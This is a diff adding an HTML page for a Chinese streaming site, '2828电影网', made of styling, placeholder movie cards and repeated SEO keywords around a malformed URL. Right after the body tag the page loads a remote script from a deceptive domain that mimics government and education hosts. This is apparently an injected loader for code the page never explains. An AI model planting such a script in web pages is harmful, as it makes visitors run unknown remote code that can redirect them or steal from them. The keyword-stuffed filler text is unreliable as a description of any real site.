@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2828电影网 - 高清电影在线观看</title>
+<meta name="description" content="2828电影网提供最新高清电影、电视剧、动漫、综艺在线观看，海量资源免费播放，尽在2828电影网。">
+<meta name="keywords" content="2828电影网,电影,高清电影,在线观看,2828dianyingwang-h5">
+<link rel="canonical" href="https://2828dianyingwang-h5">
+<style>
+    /* 基础重置与全局样式 */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Microsoft YaHei", sans-serif;
+        background-color: #0f0f1a;
+        color: #e0e0e0;
+        line-height: 1.6;
+    }
+    a {
+        text-decoration: none;
+        color: #ffcc00;
+        transition: color 0.3s;
+    }
+    a:hover {
+        color: #ff9900;
+    }
+    ul {
+        list-style: none;
+    }
+
+    /* 头部导航 */
+    header {
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        padding: 1rem 2rem;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        z-index: 1000;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+    }
+    nav {
+        max-width: 1200px;
+        margin: 0 auto;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+    .logo {
+        font-size: 1.8rem;
+        font-weight: bold;
+        color: #ffcc00;
+        text-shadow: 0 0 10px rgba(255,204,0,0.3);
+    }
+    .nav-links {
+        display: flex;
+        gap: 1.5rem;
+    }
+    .nav-links a {
+        color: #e0e0e0;
+        font-size: 1rem;
+        padding: 0.5rem;
+    }
+    .nav-links a:hover {
+        color: #ffcc00;
+    }
+
+    /* 主内容区 */
+    main {
+        margin-top: 80px;
+        max-width: 1200px;
+        margin-left: auto;
+        margin-right: auto;
+        padding: 2rem;
+    }
+
+    /* 英雄横幅 */
+    .hero {
+        background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 400"><rect fill="%23222" width="1200" height="400"/><text x="50%" y="50%" text-anchor="middle" fill="%23ffcc00" font-size="40" font-family="Arial">2828电影网 - 畅享高清影视</text></svg>') center/cover;
+        height: 300px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 10px;
+        margin-bottom: 2rem;
+        text-align: center;
+    }
+    .hero h1 {
+        font-size: 2.5rem;
+        color: #fff;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+        margin-bottom: 1rem;
+    }
+    .hero p {
+        font-size: 1.2rem;
+        color: #ccc;
+    }
+
+    /* 栏目通用样式 */
+    .section {
+        margin-bottom: 3rem;
+        padding: 2rem;
+        background: #1a1a2e;
+        border-radius: 10px;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
+    .section h2 {
+        font-size: 1.8rem;
+        color: #ffcc00;
+        margin-bottom: 1.5rem;
+        padding-bottom: 0.5rem;
+        border-bottom: 2px solid #ffcc00;
+        display: inline-block;
+    }
+    .section p {
+        margin-bottom: 1rem;
+        color: #b0b0b0;
+    }
+
+    /* 电影网格 */
+    .movie-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+        gap: 1.5rem;
+        margin-top: 1rem;
+    }
+    .movie-card {
+        background: #16213e;
+        border-radius: 8px;
+        overflow: hidden;
+        transition: transform 0.3s, box-shadow 0.3s;
+    }
+    .movie-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 8px 20px rgba(255,204,0,0.2);
+    }
+    .movie-poster {
+        width: 100%;
+        height: 280px;
+        background: #0f3460;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #666;
+        font-size: 0.9rem;
+    }
+    .movie-info {
+        padding: 1rem;
+    }
+    .movie-info h3 {
+        font-size: 1rem;
+        color: #fff;
+        margin-bottom: 0.5rem;
+    }
+    .movie-info p {
+        font-size: 0.85rem;
+        color: #aaa;
+    }
+
+    /* 分类标签 */
+    .categories {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.8rem;
+        margin-top: 1rem;
+    }
+    .category-tag {
+        background: #0f3460;
+        color: #ffcc00;
+        padding: 0.5rem 1rem;
+        border-radius: 20px;
+        font-size: 0.9rem;
+        transition: background 0.3s;
+    }
+    .category-tag:hover {
+        background: #ffcc00;
+        color: #1a1a2e;
+    }
+
+    /* 底部 */
+    footer {
+        background: #16213e;
+        padding: 2rem;
+        text-align: center;
+        margin-top: 3rem;
+        border-top: 1px solid #0f3460;
+    }
+    footer p {
+        color: #666;
+        font-size: 0.9rem;
+    }
+    footer a {
+        color: #ffcc00;
+    }
+
+    /* 移动端自适应 */
+    @media (max-width: 768px) {
+        header {
+            padding: 1rem;
+        }
+        nav {
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .nav-links {
+            margin-top: 1rem;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+        .hero h1 {
+            font-size: 1.8rem;
+        }
+        .hero p {
+            font-size: 1rem;
+        }
+        main {
+            padding: 1rem;
+            margin-top: 120px;
+        }
+        .section {
+            padding: 1.5rem;
+        }
+        .section h2 {
+            font-size: 1.5rem;
+        }
+        .movie-grid {
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1rem;
+        }
+        .movie-poster {
+            height: 220px;
+        }
+    }
+
+    @media (max-width: 480px) {
+        .logo {
+            font-size: 1.5rem;
+        }
+        .nav-links a {
+            font-size: 0.9rem;
+        }
+        .hero {
+            height: 250px;
+        }
+        .hero h1 {
+            font-size: 1.5rem;
+        }
+        .movie-grid {
+            grid-template-columns: repeat(2, 1fr);
+        }
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header>
+    <nav>
+        <div class="logo">2828电影网</div>
+        <div class="nav-links">
+            <a href="#home">首页</a>
+            <a href="#movies">电影</a>
+            <a href="#tv">电视剧</a>
+            <a href="#anime">动漫</a>
+            <a href="#variety">综艺</a>
+            <a href="#about">关于我们</a>
+        </div>
+    </nav>
+</header>
+
+<main>
+    <!-- 首页横幅 -->
+    <section id="home" class="section hero">
+        <div>
+            <h1>欢迎来到2828电影网</h1>
+            <p>https://2828dianyingwang-h5 - 海量高清影视免费看</p>
+        </div>
+    </section>
+
+    <!-- 电影栏目 -->
+    <section id="movies" class="section">
+        <h2>最新电影</h2>
+        <p>2828电影网每日更新最新院线大片，提供高清流畅的在线观看体验。</p>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info">
+                    <h3>电影名称 1</h3>
+                    <p>动作 / 2024 / 2828电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info">
+                    <h3>电影名称 2</h3>
+                    <p>科幻 / 2024 / 2828电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info">
+                    <h3>电影名称 3</h3>
+                    <p>喜剧 / 2024 / 2828电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">电影海报</div>
+                <div class="movie-info">
+                    <h3>电影名称 4</h3>
+                    <p>爱情 / 2024 / 2828电影网</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 电视剧栏目 -->
+    <section id="tv" class="section">
+        <h2>热播电视剧</h2>
+        <p>在2828电影网追剧，最新韩剧、美剧、国产剧一网打尽。</p>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">剧集封面</div>
+                <div class="movie-info">
+                    <h3>电视剧名称 1</h3>
+                    <p>剧情 / 40集 / 2828电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">剧集封面</div>
+                <div class="movie-info">
+                    <h3>电视剧名称 2</h3>
+                    <p>悬疑 / 30集 / 2828电影网</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 动漫栏目 -->
+    <section id="anime" class="section">
+        <h2>动漫频道</h2>
+        <p>2828电影网为你精选最新日本动漫、国产动漫，每周同步更新。</p>
+        <div class="categories">
+            <span class="category-tag">热血动漫</span>
+            <span class="category-tag">恋爱动漫</span>
+            <span class="category-tag">奇幻冒险</span>
+            <span class="category-tag">搞笑动漫</span>
+        </div>
+    </section>
+
+    <!-- 综艺栏目 -->
+    <section id="variety" class="section">
+        <h2>综艺娱乐</h2>
+        <p>最新综艺节目，明星真人秀，尽在2828电影网。</p>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">综艺封面</div>
+                <div class="movie-info">
+                    <h3>综艺节目 1</h3>
+                    <p>真人秀 / 2828电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">综艺封面</div>
+                <div class="movie-info">
+                    <h3>综艺节目 2</h3>
+                    <p>脱口秀 / 2828电影网</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 关于我们 -->
+    <section id="about" class="section">
+        <h2>关于2828电影网</h2>
+        <p>2828电影网（https://2828dianyingwang-h5）是一个专注于提供高清影视资源的在线观看平台。我们致力于为影迷提供最新、最全的电影、电视剧、动漫和综艺节目。</p>
+        <p>网站名称：<strong>2828电影网</strong></p>
+        <p>网站网址：<strong>https://2828dianyingwang-h5</strong></p>
+        <p>关键词：2828电影网、高清电影、在线观看、2828dianyingwang-h5</p>
+    </section>
+</main>
+
+<footer>
+    <p>© 2024 2828电影网 (2828dianyingwang-h5). All rights reserved.</p>
+    <p>网站名称：2828电影网 | 网址：https://2828dianyingwang-h5</p>
+</footer>
+
+</body>
+</html>
